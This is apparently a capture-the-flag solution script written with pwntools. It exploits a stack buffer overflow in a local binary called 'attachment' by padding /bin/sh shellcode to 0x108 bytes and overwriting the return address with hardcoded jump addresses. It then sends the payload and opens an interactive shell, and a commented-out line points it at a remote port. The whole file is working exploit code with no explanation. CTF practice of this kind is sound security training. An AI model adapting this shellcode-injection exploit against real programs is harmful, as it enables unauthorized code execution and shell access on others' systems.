#!/usr/bin/python3
# -*- encoding: utf-8 -*-

from pwn import *

# context.log_level = "debug"
context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0', '--title', 'gdb', 'bash', '-c']

# p = remote("127.0.0.1", 9999)
p = process("./attachment")
elf = ELF("./attachment")
# gdb.attach(p, "b *0x401226")

target_address = 0x4012E3

# 64位
context(arch="amd64",os="linux")
stack_len = 0x100 + 0x8

shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(stack_len , b"\xff") + p64(0x4011A6) + p64(target_address)

# input()

p.send(payload)

p.interactive()